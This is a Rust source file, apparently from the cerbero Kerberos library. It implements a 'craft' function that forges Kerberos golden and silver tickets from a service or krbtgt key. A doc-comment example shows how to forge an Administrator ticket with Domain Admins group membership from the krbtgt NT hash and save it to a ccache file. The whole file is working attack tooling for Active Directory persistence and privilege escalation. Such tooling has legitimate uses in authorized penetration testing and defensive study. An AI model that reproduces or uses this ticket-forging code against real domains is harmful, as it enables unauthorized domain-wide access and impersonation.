use crate::{
	core::{craft_ticket_info, CredFormat, EncryptionType, TicketCreds, Vault},
	KrbUser, Result,
};
use kerberos_crypto::Key;
use ms_pac::PISID;

/// Crafts gold and silver tickets
///
/// # Examples
///
/// ```
/// use cerbero_lib::{craft, CredFormat, EncryptionType, FileVault, Key, KrbUser, Vault, PISID};
///
/// fn main()
/// {
///     let user = KrbUser::new("Administrator".to_string(), "DOMAIN.COM".to_string());
///     let vault = FileVault::new("tickets.ccache".to_string());
///
///     let rid = 500;
///     let sid = PISID::try_from("DOMAIN_SID").expect("Failed to convert SID");
///     let group_rids = [512];
///
///     let krbtgt = Key::from_rc4_key_string("KRBTGT NT HASH").expect("Failed to convert krbtgt key");
///
///     match craft(user, None, krbtgt, rid, sid, &group_rids, Some(EncryptionType::RC4), CredFormat::Ccache, &vault)
///     {
///         Ok(_) =>
///         {
///             for ticket in vault.dump().expect("Failed to dump tickets").iter()
///             {
///                 println!("{:?}", ticket);
///             }
///         },
///         Err(e) => panic!("Failed to craft a golden ticket: {}", e),
///     };
/// }
/// ```
pub fn craft(user: KrbUser,
             service: Option<String>,
             ticket_key: Key,
             user_rid: u32,
             realm_sid: PISID,
             groups: &[u32],
             ticket_key_enc: Option<EncryptionType>,
             cred_format: CredFormat,
             vault: &dyn Vault)
             -> Result<()>
{
	let ticket_info = craft_ticket_info(
	                                    user,
	                                    service.clone(),
	                                    ticket_key,
	                                    user_rid,
	                                    realm_sid,
	                                    groups,
	                                    ticket_key_enc.map(|e| e.as_constant()),
	);

	let krb_cred_plain = TicketCreds::new(vec![ticket_info]);

	vault.save_as(krb_cred_plain, cred_format)?;

	Ok(())
}
